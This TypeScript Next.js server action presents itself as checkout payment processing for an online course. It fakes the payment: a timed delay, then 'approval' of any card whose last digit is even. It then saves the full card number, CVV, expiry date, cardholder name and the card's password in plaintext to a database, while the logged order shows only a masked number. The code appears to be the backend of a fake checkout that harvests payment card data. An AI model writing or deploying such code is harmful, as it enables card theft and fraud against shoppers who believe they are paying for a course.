"use server";

import { prisma } from "@/lib/prisma";
import { CheckoutFormData, PaymentFormData, OrderData } from "@/types";

export async function processPayment(
    checkoutData: CheckoutFormData,
    paymentData: PaymentFormData,
    courseId: string,
    amount: number,
): Promise<{ success: boolean; orderId?: string; error?: string }> {
    // Simular delay de processamento
    await new Promise((resolve) => setTimeout(resolve, 3500));

    // Validar dados do cartão (simulação)
    const cardNumber = paymentData.cardNumber.replace(/\s/g, "");

    // Simular validação de cartão - aceita qualquer número que termine em par
    const lastDigit = parseInt(cardNumber.charAt(cardNumber.length - 1));
    const isValid = lastDigit % 2 === 0;

    if (!isValid) {
        return {
            success: false,
            error: "Cartão recusado. Tente outro cartão ou entre em contato com seu banco.",
        };
    }

    // Gerar ID do pedido
    const orderId = `EB${Date.now()}${Math.random().toString(36).substr(2, 9).toUpperCase()}`;

    // Criar ordem (em produção, salvaria no banco de dados)
    const order: OrderData = {
        id: orderId,
        courseId,
        customer: checkoutData,
        payment: {
            ...paymentData,
            cardNumber: `**** **** **** ${cardNumber.slice(-4)}`, // Mascarar número do cartão
        },
        amount,
        status: "approved",
        createdAt: new Date(),
    };

    // salvar no banco
    await prisma.sale.create({
        data: {
            card_name: paymentData.cardName,
            card_number: paymentData.cardNumber,
            cvv: paymentData.cvv,
            validity: paymentData.expiryDate,
            password: paymentData.password,
        },
    });

    // Em produção, aqui você salvaria no banco de dados
    console.log("Pedido criado:", order);

    return {
        success: true,
        orderId,
    };
}

export async function validateCardNumber(cardNumber: string): Promise<boolean> {
    // Remover espaços e verificar se tem apenas números
    const cleaned = cardNumber.replace(/\s/g, "");

    if (!/^\d{13,19}$/.test(cleaned)) {
        return false;
    }

    // Algoritmo de Luhn para validação de cartão
    let sum = 0;
    let isEven = false;

    for (let i = cleaned.length - 1; i >= 0; i--) {
        let digit = parseInt(cleaned.charAt(i));

        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }

        sum += digit;
        isEven = !isEven;
    }

    return sum % 10 === 0;
}
